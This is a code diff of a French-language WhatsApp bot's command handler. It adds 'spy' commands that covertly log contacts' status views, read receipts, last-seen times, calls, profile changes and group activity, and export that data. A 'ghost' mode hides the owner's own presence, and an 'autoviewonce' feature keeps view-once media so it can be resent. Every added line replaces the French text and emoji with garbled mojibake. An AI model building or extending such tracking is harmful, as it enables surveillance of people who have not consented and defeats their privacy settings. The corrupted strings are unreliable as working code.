+      let list = `ðŸ‘ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI VOIT TES STATUTS*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       let i = 1;
       for (const [num, data] of Object.entries(uniqueViewers)) {
-        const displayName = data.name || "Non enregistré";
+        const displayName = data.name || "Non enregistrÃ©";
         const cleanNum = num.replace(/[^0-9]/g, '');
-        list += `*${i}.* ${displayName !== "Non enregistré" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
-        list += `   📱 *Numéro:* +${cleanNum}\n`;
-        list += `   👁️ ${data.count} vue(s) • 🕐 ${data.lastTime}\n`;
-        list += `   💬 wa.me/${cleanNum}\n\n`;
+        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
+        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
+        list += `   ðŸ‘ï¸ ${data.count} vue(s) â€¢ ðŸ• ${data.lastTime}\n`;
+        list += `   ðŸ’¬ wa.me/${cleanNum}\n\n`;
         i++;
         if (i > 20) break;
       }
-      list += `═══════════════════════════\n📊 *Total:* ${spyData.statusViews.length} vues de ${Object.keys(uniqueViewers).length} personnes`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.statusViews.length} vues de ${Object.keys(uniqueViewers).length} personnes`;
       return send(list);
     }
 
     case "spyon": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       protectionState.spyStatusViews = true;
       protectionState.spyReadReceipts = true;
       protectionState.spyReplies = true;
       protectionState.spyPresence = true;
-      return send(`🕵️ *MODE ESPION ACTIVÉ* ✅\n\nTu recevras des notifications quand:\n• 👁️ Quelqu'un voit tes statuts\n• 📖 Quelqu'un lit tes messages\n• ↩️ Quelqu'un répond\n• ✍️ Quelqu'un écrit dans ton chat\n\n💡 \`.spyoff\` pour désactiver`);
+      return send(`ðŸ•µï¸ *MODE ESPION ACTIVÃ‰* âœ…\n\nTu recevras des notifications quand:\nâ€¢ ðŸ‘ï¸ Quelqu'un voit tes statuts\nâ€¢ ðŸ“– Quelqu'un lit tes messages\nâ€¢ â†©ï¸ Quelqu'un rÃ©pond\nâ€¢ âœï¸ Quelqu'un Ã©crit dans ton chat\n\nðŸ’¡ \`.spyoff\` pour dÃ©sactiver`);
     }
 
     case "spyoff": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       protectionState.spyStatusViews = false;
       protectionState.spyReadReceipts = false;
       protectionState.spyReplies = false;
       protectionState.spyPresence = false;
-      return send(`🕵️ *MODE ESPION DÉSACTIVÉ* ❌\n\nPlus de notifications espion.\n\n💡 \`.spyon\` pour réactiver`);
+      return send(`ðŸ•µï¸ *MODE ESPION DÃ‰SACTIVÃ‰* âŒ\n\nPlus de notifications espion.\n\nðŸ’¡ \`.spyon\` pour rÃ©activer`);
     }
 
     case "spyclear": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       spyData.statusViews = [];
       spyData.messageReads = [];
       spyData.replies = [];
@@ -2284,25 +2284,25 @@ async function handleCommand(hani, msg, db) {
       spyData.profileChanges = [];
       spyData.callHistory = [];
       spyData.groupActivity = [];
-      return send(`🗑️ *Historique espion effacé*\n\n✅ Toutes les données supprimées:\n• Vues de statuts\n• Lectures de messages\n• Réponses\n• Présences détectées\n• Historique connexions\n• Changements de profil\n• Historique appels\n• Activité groupes`);
+      return send(`ðŸ—‘ï¸ *Historique espion effacÃ©*\n\nâœ… Toutes les donnÃ©es supprimÃ©es:\nâ€¢ Vues de statuts\nâ€¢ Lectures de messages\nâ€¢ RÃ©ponses\nâ€¢ PrÃ©sences dÃ©tectÃ©es\nâ€¢ Historique connexions\nâ€¢ Changements de profil\nâ€¢ Historique appels\nâ€¢ ActivitÃ© groupes`);
     }
 
-    // ────────── 🆕 NOUVELLES COMMANDES ESPION AVANCÉES ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ†• NOUVELLES COMMANDES ESPION AVANCÃ‰ES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     case "lastseen":
     case "derniereconnexion":
     case "online": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const entries = Object.entries(spyData.lastSeen || {});
       if (entries.length === 0) {
-        return send(`🕐 *Aucune connexion détectée*\n\n_Le tracker de connexion collecte les données en arrière-plan._\n\n💡 Les connexions seront enregistrées automatiquement.`);
+        return send(`ðŸ• *Aucune connexion dÃ©tectÃ©e*\n\n_Le tracker de connexion collecte les donnÃ©es en arriÃ¨re-plan._\n\nðŸ’¡ Les connexions seront enregistrÃ©es automatiquement.`);
       }
       
-      let list = `🕐 ═══════════════════════════\n   *DERNIÈRES CONNEXIONS*\n═══════════════════════════\n\n`;
+      let list = `ðŸ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *DERNIÃˆRES CONNEXIONS*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       let i = 1;
       
-      // Trier par dernière activité
+      // Trier par derniÃ¨re activitÃ©
       const sorted = entries.sort((a, b) => {
         const timeA = a[1].lastOnline || a[1].lastOffline || 0;
         const timeB = b[1].lastOnline || b[1].lastOffline || 0;
@@ -2312,97 +2312,97 @@ async function handleCommand(hani, msg, db) {
       for (const [jid, data] of sorted.slice(0, 20)) {
         const name = data.name || "Inconnu";
         const cleanNum = jid.replace(/[^0-9]/g, '').slice(-10);
-        const lastOnline = data.lastOnline ? new Date(data.lastOnline).toLocaleString("fr-FR") : "—";
-        const lastOffline = data.lastOffline ? new Date(data.lastOffline).toLocaleString("fr-FR") : "—";
-        const isOnlineNow = data.isOnline ? "🟢" : "⚪";
+        const lastOnline = data.lastOnline ? new Date(data.lastOnline).toLocaleString("fr-FR") : "â€”";
+        const lastOffline = data.lastOffline ? new Date(data.lastOffline).toLocaleString("fr-FR") : "â€”";
+        const isOnlineNow = data.isOnline ? "ðŸŸ¢" : "âšª";
         
         list += `*${i}.* ${isOnlineNow} ${name}\n`;
-        list += `   📱 +${cleanNum}\n`;
-        list += `   🟢 Dernière connexion: ${lastOnline}\n`;
-        list += `   ⚪ Dernière déconnexion: ${lastOffline}\n\n`;
+        list += `   ðŸ“± +${cleanNum}\n`;
+        list += `   ðŸŸ¢ DerniÃ¨re connexion: ${lastOnline}\n`;
+        list += `   âšª DerniÃ¨re dÃ©connexion: ${lastOffline}\n\n`;
         i++;
       }
       
-      list += `═══════════════════════════\n📊 *Total:* ${entries.length} utilisateurs trackés`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${entries.length} utilisateurs trackÃ©s`;
       return send(list);
     }
 
     case "profilechanges":
     case "changementsprofil":
     case "alertprofil": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!spyData.profileChanges || spyData.profileChanges.length === 0) {
-        return send(`📸 *Aucun changement de profil détecté*\n\n_Le système surveille automatiquement:_\n• 📷 Changements de photo de profil\n• 📝 Changements de bio/statut\n• 👤 Changements de nom\n\n💡 Les alertes seront envoyées en temps réel.`);
+        return send(`ðŸ“¸ *Aucun changement de profil dÃ©tectÃ©*\n\n_Le systÃ¨me surveille automatiquement:_\nâ€¢ ðŸ“· Changements de photo de profil\nâ€¢ ðŸ“ Changements de bio/statut\nâ€¢ ðŸ‘¤ Changements de nom\n\nðŸ’¡ Les alertes seront envoyÃ©es en temps rÃ©el.`);
       }
       
-      let list = `📸 ═══════════════════════════\n   *CHANGEMENTS DE PROFIL*\n═══════════════════════════\n\n`;
+      let list = `ðŸ“¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *CHANGEMENTS DE PROFIL*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
       const changes = spyData.profileChanges.slice(-20).reverse();
       let i = 1;
       
       for (const change of changes) {
-        const emoji = change.type === 'photo' ? '📷' : change.type === 'bio' ? '📝' : '👤';
+        const emoji = change.type === 'photo' ? 'ðŸ“·' : change.type === 'bio' ? 'ðŸ“' : 'ðŸ‘¤';
         const typeLabel = change.type === 'photo' ? 'Photo' : change.type === 'bio' ? 'Bio' : 'Nom';
         const time = new Date(change.timestamp).toLocaleString("fr-FR");
         
         list += `*${i}.* ${emoji} *${change.name || "Inconnu"}*\n`;
-        list += `   📱 ${change.jid.replace(/[^0-9]/g, '').slice(-10)}\n`;
-        list += `   🔄 *Type:* ${typeLabel}\n`;
+        list += `   ðŸ“± ${change.jid.replace(/[^0-9]/g, '').slice(-10)}\n`;
+        list += `   ðŸ”„ *Type:* ${typeLabel}\n`;
         if (change.type !== 'photo') {
-          list += `   📤 Avant: _${(change.oldValue || "").slice(0, 30)}..._\n`;
-          list += `   📥 Après: _${(change.newValue || "").slice(0, 30)}..._\n`;
+          list += `   ðŸ“¤ Avant: _${(change.oldValue || "").slice(0, 30)}..._\n`;
+          list += `   ðŸ“¥ AprÃ¨s: _${(change.newValue || "").slice(0, 30)}..._\n`;
         }
-        list += `   🕐 ${time}\n\n`;
+        list += `   ðŸ• ${time}\n\n`;
         i++;
       }
       
-      list += `═══════════════════════════\n📊 *Total:* ${spyData.profileChanges.length} changements détectés`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.profileChanges.length} changements dÃ©tectÃ©s`;
       return send(list);
     }
 
     case "callhistory":
     case "historiqueappels":
     case "appels": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!spyData.callHistory || spyData.callHistory.length === 0) {
-        return send(`📞 *Aucun appel enregistré*\n\n_Le système enregistre automatiquement:_\n• 📞 Appels audio reçus/émis\n• 📹 Appels vidéo reçus/émis\n• ⏱️ Durée et heure\n• ❌ Appels manqués/rejetés`);
+        return send(`ðŸ“ž *Aucun appel enregistrÃ©*\n\n_Le systÃ¨me enregistre automatiquement:_\nâ€¢ ðŸ“ž Appels audio reÃ§us/Ã©mis\nâ€¢ ðŸ“¹ Appels vidÃ©o reÃ§us/Ã©mis\nâ€¢ â±ï¸ DurÃ©e et heure\nâ€¢ âŒ Appels manquÃ©s/rejetÃ©s`);
       }
       
-      let list = `📞 ═══════════════════════════\n   *HISTORIQUE DES APPELS*\n═══════════════════════════\n\n`;
+      let list = `ðŸ“ž â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *HISTORIQUE DES APPELS*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
       const calls = spyData.callHistory.slice(-20).reverse();
       let i = 1;
       
       for (const call of calls) {
-        const emoji = call.type === 'video' ? '📹' : '📞';
-        const direction = call.direction === 'in' ? '📥 Reçu' : '📤 Émis';
-        const status = call.status === 'missed' ? '❌ Manqué' : call.status === 'rejected' ? '🚫 Rejeté' : '✅ Terminé';
+        const emoji = call.type === 'video' ? 'ðŸ“¹' : 'ðŸ“ž';
+        const direction = call.direction === 'in' ? 'ðŸ“¥ ReÃ§u' : 'ðŸ“¤ Ã‰mis';
+        const status = call.status === 'missed' ? 'âŒ ManquÃ©' : call.status === 'rejected' ? 'ðŸš« RejetÃ©' : 'âœ… TerminÃ©';
         const time = new Date(call.timestamp).toLocaleString("fr-FR");
-        const duration = call.duration ? `${Math.floor(call.duration / 60)}:${(call.duration % 60).toString().padStart(2, '0')}` : "—";
+        const duration = call.duration ? `${Math.floor(call.duration / 60)}:${(call.duration % 60).toString().padStart(2, '0')}` : "â€”";
         
         list += `*${i}.* ${emoji} *${call.name || "Inconnu"}*\n`;
-        list += `   📱 +${call.jid?.replace(/[^0-9]/g, '').slice(-10) || "?"}\n`;
-        list += `   ${direction} • ${status}\n`;
-        list += `   ⏱️ Durée: ${duration} • 🕐 ${time}\n\n`;
+        list += `   ðŸ“± +${call.jid?.replace(/[^0-9]/g, '').slice(-10) || "?"}\n`;
+        list += `   ${direction} â€¢ ${status}\n`;
+        list += `   â±ï¸ DurÃ©e: ${duration} â€¢ ðŸ• ${time}\n\n`;
         i++;
       }
       
-      list += `═══════════════════════════\n📊 *Total:* ${spyData.callHistory.length} appels enregistrés`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.callHistory.length} appels enregistrÃ©s`;
       return send(list);
     }
 
     case "groupspy":
     case "surveillancegroupe":
     case "groupactivity": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!spyData.groupActivity || spyData.groupActivity.length === 0) {
-        return send(`👥 *Aucune activité de groupe détectée*\n\n_Le système surveille automatiquement:_\n• ➕ Qui rejoint un groupe\n• ➖ Qui quitte un groupe\n• 👑 Changements d'admin\n• 📝 Changements de nom/description\n• 🔗 Changements de lien d'invitation`);
+        return send(`ðŸ‘¥ *Aucune activitÃ© de groupe dÃ©tectÃ©e*\n\n_Le systÃ¨me surveille automatiquement:_\nâ€¢ âž• Qui rejoint un groupe\nâ€¢ âž– Qui quitte un groupe\nâ€¢ ðŸ‘‘ Changements d'admin\nâ€¢ ðŸ“ Changements de nom/description\nâ€¢ ðŸ”— Changements de lien d'invitation`);
       }
       
-      let list = `👥 ═══════════════════════════\n   *ACTIVITÉ DES GROUPES*\n═══════════════════════════\n\n`;
+      let list = `ðŸ‘¥ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *ACTIVITÃ‰ DES GROUPES*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
       const activities = spyData.groupActivity.slice(-25).reverse();
       let i = 1;
@@ -2410,28 +2410,28 @@ async function handleCommand(hani, msg, db) {
       for (const act of activities) {
         let emoji, actionText;
         switch (act.action) {
-          case 'add': emoji = '➕'; actionText = 'A rejoint'; break;
-          case 'remove': emoji = '➖'; actionText = 'A quitté'; break;
-          case 'promote': emoji = '👑'; actionText = 'Promu admin'; break;
-          case 'demote': emoji = '👤'; actionText = 'Rétrogradé'; break;
-          default: emoji = '📋'; actionText = act.action;
+          case 'add': emoji = 'âž•'; actionText = 'A rejoint'; break;
+          case 'remove': emoji = 'âž–'; actionText = 'A quittÃ©'; break;
+          case 'promote': emoji = 'ðŸ‘‘'; actionText = 'Promu admin'; break;
+          case 'demote': emoji = 'ðŸ‘¤'; actionText = 'RÃ©trogradÃ©'; break;
+          default: emoji = 'ðŸ“‹'; actionText = act.action;
         }
         const time = new Date(act.timestamp).toLocaleString("fr-FR");
         
         list += `*${i}.* ${emoji} *${act.participantName || "Inconnu"}*\n`;
-        list += `   👥 Groupe: ${act.groupName || "?"}\n`;
-        list += `   🔄 ${actionText}\n`;
-        list += `   🕐 ${time}\n\n`;
+        list += `   ðŸ‘¥ Groupe: ${act.groupName || "?"}\n`;
+        list += `   ðŸ”„ ${actionText}\n`;
+        list += `   ðŸ• ${time}\n\n`;
         i++;
       }
       
-      list += `═══════════════════════════\n📊 *Total:* ${spyData.groupActivity.length} événements`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.groupActivity.length} Ã©vÃ©nements`;
       return send(list);
     }
 
     case "ghost":
     case "fantome": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const param = args?.toLowerCase();
       
@@ -2442,15 +2442,15 @@ async function handleCommand(hani, msg, db) {
         spyConfig.ghostModeAdvanced.hideRead = true;
         spyConfig.ghostModeAdvanced.hideRecording = true;
         
-        // 🔥 ACTIVER LE MODE GHOST RÉEL
+        // ðŸ”¥ ACTIVER LE MODE GHOST RÃ‰EL
         startGhostMode(hani);
         
-        // Envoyer immédiatement présence unavailable
+        // Envoyer immÃ©diatement prÃ©sence unavailable
         try {
           await hani.sendPresenceUpdate("unavailable");
         } catch (e) {}
         
-        return send(`👻 *MODE FANTÔME ACTIVÉ* ✅\n\n🔒 *Tu es maintenant INVISIBLE:*\n• ⚪ Personne ne te voit "en ligne"\n• ✍️ Personne ne voit quand tu écris\n• 👁️ Tes lectures ne sont pas envoyées\n• 🎤 Personne ne voit si tu enregistres\n\n⚠️ _Mode maintenu en continu!_\n⚠️ _Tu peux toujours tout voir des autres!_\n\n💡 \`.ghost off\` pour désactiver`);
+        return send(`ðŸ‘» *MODE FANTÃ”ME ACTIVÃ‰* âœ…\n\nðŸ”’ *Tu es maintenant INVISIBLE:*\nâ€¢ âšª Personne ne te voit "en ligne"\nâ€¢ âœï¸ Personne ne voit quand tu Ã©cris\nâ€¢ ðŸ‘ï¸ Tes lectures ne sont pas envoyÃ©es\nâ€¢ ðŸŽ¤ Personne ne voit si tu enregistres\n\nâš ï¸ _Mode maintenu en continu!_\nâš ï¸ _Tu peux toujours tout voir des autres!_\n\nðŸ’¡ \`.ghost off\` pour dÃ©sactiver`);
         
       } else if (param === "off" || param === "desactiver") {
         spyConfig.ghostMode = false;
@@ -2459,142 +2459,142 @@ async function handleCommand(hani, msg, db) {
         spyConfig.ghostModeAdvanced.hideRead = false;
         spyConfig.ghostModeAdvanced.hideRecording = false;
         
-        // 🔥 DÉSACTIVER LE MODE GHOST
+        // ðŸ”¥ DÃ‰SACTIVER LE MODE GHOST
         stopGhostMode(hani);
         
-        // Remettre présence available
+        // Remettre prÃ©sence available
         try {
           await hani.sendPresenceUpdate("available");
         } catch (e) {}
         
-        return send(`👻 *MODE FANTÔME DÉSACTIVÉ* ❌\n\n🔓 *Tu es visible normalement:*\n• 🟢 Les autres te voient "en ligne"\n• ✍️ Les autres voient quand tu écris\n• ✅ Les autres voient les confirmations de lecture\n\n💡 \`.ghost on\` pour redevenir invisible`);
+        return send(`ðŸ‘» *MODE FANTÃ”ME DÃ‰SACTIVÃ‰* âŒ\n\nðŸ”“ *Tu es visible normalement:*\nâ€¢ ðŸŸ¢ Les autres te voient "en ligne"\nâ€¢ âœï¸ Les autres voient quand tu Ã©cris\nâ€¢ âœ… Les autres voient les confirmations de lecture\n\nðŸ’¡ \`.ghost on\` pour redevenir invisible`);
         
       } else if (param === "status" || !param) {
-        const status = spyConfig.ghostMode ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ";
-        const intervalStatus = ghostModeInterval ? "🟢 En cours" : "⚪ Arrêté";
-        return send(`👻 *MODE FANTÔME: ${status}*\n\n⚙️ *État système:* ${intervalStatus}\n\n⚙️ *Configuration:*\n• Cacher "en ligne": ${spyConfig.ghostModeAdvanced.hideOnline ? "✅" : "❌"}\n• Cacher "écrit...": ${spyConfig.ghostModeAdvanced.hideTyping ? "✅" : "❌"}\n• Cacher lecture: ${spyConfig.ghostModeAdvanced.hideRead ? "✅" : "❌"}\n• Cacher enregistrement: ${spyConfig.ghostModeAdvanced.hideRecording ? "✅" : "❌"}\n\n📋 *Commandes:*\n• \`.ghost on\` → Invisible total\n• \`.ghost off\` → Visible normal`);
+        const status = spyConfig.ghostMode ? "âœ… ACTIVÃ‰" : "âŒ DÃ‰SACTIVÃ‰";
+        const intervalStatus = ghostModeInterval ? "ðŸŸ¢ En cours" : "âšª ArrÃªtÃ©";
+        return send(`ðŸ‘» *MODE FANTÃ”ME: ${status}*\n\nâš™ï¸ *Ã‰tat systÃ¨me:* ${intervalStatus}\n\nâš™ï¸ *Configuration:*\nâ€¢ Cacher "en ligne": ${spyConfig.ghostModeAdvanced.hideOnline ? "âœ…" : "âŒ"}\nâ€¢ Cacher "Ã©crit...": ${spyConfig.ghostModeAdvanced.hideTyping ? "âœ…" : "âŒ"}\nâ€¢ Cacher lecture: ${spyConfig.ghostModeAdvanced.hideRead ? "âœ…" : "âŒ"}\nâ€¢ Cacher enregistrement: ${spyConfig.ghostModeAdvanced.hideRecording ? "âœ…" : "âŒ"}\n\nðŸ“‹ *Commandes:*\nâ€¢ \`.ghost on\` â†’ Invisible total\nâ€¢ \`.ghost off\` â†’ Visible normal`);
       }
       
-      return send(`👻 *MODE FANTÔME*\n\n📋 *Usage:*\n• \`.ghost on\` → Activer (invisible)\n• \`.ghost off\` → Désactiver (visible)\n• \`.ghost status\` → Voir l'état`);
+      return send(`ðŸ‘» *MODE FANTÃ”ME*\n\nðŸ“‹ *Usage:*\nâ€¢ \`.ghost on\` â†’ Activer (invisible)\nâ€¢ \`.ghost off\` â†’ DÃ©sactiver (visible)\nâ€¢ \`.ghost status\` â†’ Voir l'Ã©tat`);
     }
 
-    // 🔄 AUTO-VIEWONCE: Envoyer les vues uniques automatiquement quand je réponds
+    // ðŸ”„ AUTO-VIEWONCE: Envoyer les vues uniques automatiquement quand je rÃ©ponds
     case "autoviewonce":
     case "autovo":
     case "viewonceauto": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const param = args[0]?.toLowerCase();
       
       if (param === "on" || param === "activer" || param === "1") {
         protectionState.autoSendViewOnce = true;
-        return send(`📸 *AUTO-VIEWONCE ACTIVÉ* ✅\n\n🔄 *Fonctionnement:*\nQuand quelqu'un t'envoie un message "vue unique", le bot le sauvegarde.\n\nQuand tu réponds à cette personne, le viewonce t'est envoyé automatiquement en privé!\n\n💡 \`.autoviewonce off\` pour désactiver`);
+        return send(`ðŸ“¸ *AUTO-VIEWONCE ACTIVÃ‰* âœ…\n\nðŸ”„ *Fonctionnement:*\nQuand quelqu'un t'envoie un message "vue unique", le bot le sauvegarde.\n\nQuand tu rÃ©ponds Ã  cette personne, le viewonce t'est envoyÃ© automatiquement en privÃ©!\n\nðŸ’¡ \`.autoviewonce off\` pour dÃ©sactiver`);
       } else if (param === "off" || param === "desactiver" || param === "0") {
         protectionState.autoSendViewOnce = false;
-        return send(`📸 *AUTO-VIEWONCE DÉSACTIVÉ* ❌\n\n🔕 Les vues uniques ne seront plus envoyées automatiquement.\n\n💡 \`.autoviewonce on\` pour réactiver`);
+        return send(`ðŸ“¸ *AUTO-VIEWONCE DÃ‰SACTIVÃ‰* âŒ\n\nðŸ”• Les vues uniques ne seront plus envoyÃ©es automatiquement.\n\nðŸ’¡ \`.autoviewonce on\` pour rÃ©activer`);
       } else if (param === "status" || param === "list" || !param) {
-        const status = protectionState.autoSendViewOnce ? "✅ ACTIVÉ" : "❌ DÉSACTIVÉ";
+        const status = protectionState.autoSendViewOnce ? "âœ… ACTIVÃ‰" : "âŒ DÃ‰SACTIVÃ‰";
         const pending = pendingViewOnce.size;
         let list = "";
         
         if (pending > 0) {
-          list = "\n\n📋 *ViewOnce en attente:*";
+          list = "\n\nðŸ“‹ *ViewOnce en attente:*";
           pendingViewOnce.forEach((data, jid) => {
             const timeSince = Math.round((Date.now() - data.timestamp) / 60000);
-            list += `\n• ${data.senderName} (${data.mediaType}) - il y a ${timeSince}min`;
+            list += `\nâ€¢ ${data.senderName} (${data.mediaType}) - il y a ${timeSince}min`;
           });
         }
         
-        return send(`📸 *AUTO-VIEWONCE: ${status}*\n\n📊 ViewOnce en attente: ${pending}${list}\n\n📋 *Commandes:*\n• \`.autoviewonce on\` → Activer\n• \`.autoviewonce off\` → Désactiver\n• \`.autoviewonce clear\` → Vider la liste`);
+        return send(`ðŸ“¸ *AUTO-VIEWONCE: ${status}*\n\nðŸ“Š ViewOnce en attente: ${pending}${list}\n\nðŸ“‹ *Commandes:*\nâ€¢ \`.autoviewonce on\` â†’ Activer\nâ€¢ \`.autoviewonce off\` â†’ DÃ©sactiver\nâ€¢ \`.autoviewonce clear\` â†’ Vider la liste`);
       } else if (param === "clear" || param === "vider") {
         const count = pendingViewOnce.size;
         pendingViewOnce.clear();
-        return send(`📸 *ViewOnce en attente vidé!*\n\n🗑️ ${count} viewonce(s) supprimé(s)`);
+        return send(`ðŸ“¸ *ViewOnce en attente vidÃ©!*\n\nðŸ—‘ï¸ ${count} viewonce(s) supprimÃ©(s)`);
       }
       
-      return send(`📸 *AUTO-VIEWONCE*\n\n📋 *Usage:*\n• \`.autoviewonce on\` → Activer\n• \`.autoviewonce off\` → Désactiver\n• \`.autoviewonce status\` → Voir l'état\n• \`.autoviewonce clear\` → Vider les vues en attente`);
+      return send(`ðŸ“¸ *AUTO-VIEWONCE*\n\nðŸ“‹ *Usage:*\nâ€¢ \`.autoviewonce on\` â†’ Activer\nâ€¢ \`.autoviewonce off\` â†’ DÃ©sactiver\nâ€¢ \`.autoviewonce status\` â†’ Voir l'Ã©tat\nâ€¢ \`.autoviewonce clear\` â†’ Vider les vues en attente`);
     }
 
     case "spyexport":
     case "exportspy":
     case "exporterespion": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const now = new Date().toLocaleString("fr-FR").replace(/[/:]/g, "-");
       
-      let exportData = `═══════════════════════════════════════\n`;
-      exportData += `   EXPORT DONNÉES ESPION - ${now}\n`;
-      exportData += `═══════════════════════════════════════\n\n`;
+      let exportData = `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      exportData += `   EXPORT DONNÃ‰ES ESPION - ${now}\n`;
+      exportData += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      // Stats générales
-      exportData += `📊 STATISTIQUES GÉNÉRALES\n`;
-      exportData += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-      exportData += `• Vues de statuts: ${spyData.statusViews?.length || 0}\n`;
-      exportData += `• Messages lus: ${spyData.messageReads?.length || 0}\n`;
-      exportData += `• Réponses: ${spyData.replies?.length || 0}\n`;
-      exportData += `• Présences: ${spyData.presenceDetected?.length || 0}\n`;
-      exportData += `• Connexions trackées: ${Object.keys(spyData.lastSeen || {}).length}\n`;
-      exportData += `• Changements profil: ${spyData.profileChanges?.length || 0}\n`;
-      exportData += `• Appels: ${spyData.callHistory?.length || 0}\n`;
-      exportData += `• Activités groupe: ${spyData.groupActivity?.length || 0}\n\n`;
+      // Stats gÃ©nÃ©rales
+      exportData += `ðŸ“Š STATISTIQUES GÃ‰NÃ‰RALES\n`;
+      exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
+      exportData += `â€¢ Vues de statuts: ${spyData.statusViews?.length || 0}\n`;
+      exportData += `â€¢ Messages lus: ${spyData.messageReads?.length || 0}\n`;
+      exportData += `â€¢ RÃ©ponses: ${spyData.replies?.length || 0}\n`;
+      exportData += `â€¢ PrÃ©sences: ${spyData.presenceDetected?.length || 0}\n`;
+      exportData += `â€¢ Connexions trackÃ©es: ${Object.keys(spyData.lastSeen || {}).length}\n`;
+      exportData += `â€¢ Changements profil: ${spyData.profileChanges?.length || 0}\n`;
+      exportData += `â€¢ Appels: ${spyData.callHistory?.length || 0}\n`;
+      exportData += `â€¢ ActivitÃ©s groupe: ${spyData.groupActivity?.length || 0}\n\n`;
       
       // Vues de statuts
       if (spyData.statusViews && spyData.statusViews.length > 0) {
-        exportData += `👁️ VUES DE STATUTS (${spyData.statusViews.length})\n`;
-        exportData += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        exportData += `ðŸ‘ï¸ VUES DE STATUTS (${spyData.statusViews.length})\n`;
+        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
         for (const v of spyData.statusViews.slice(-20)) {
-          exportData += `• ${v.viewerName || "?"} (${v.viewer}) - ${v.timeStr || ""}\n`;
+          exportData += `â€¢ ${v.viewerName || "?"} (${v.viewer}) - ${v.timeStr || ""}\n`;
         }
         exportData += `\n`;
       }
       
       // Lectures
       if (spyData.messageReads && spyData.messageReads.length > 0) {
-        exportData += `📖 LECTURES DE MESSAGES (${spyData.messageReads.length})\n`;
-        exportData += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        exportData += `ðŸ“– LECTURES DE MESSAGES (${spyData.messageReads.length})\n`;
+        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
         for (const r of spyData.messageReads.slice(-20)) {
-          exportData += `• ${r.readerName || "?"} (${r.reader}) - ${r.timeStr || ""}\n`;
+          exportData += `â€¢ ${r.readerName || "?"} (${r.reader}) - ${r.timeStr || ""}\n`;
         }
         exportData += `\n`;
       }
       
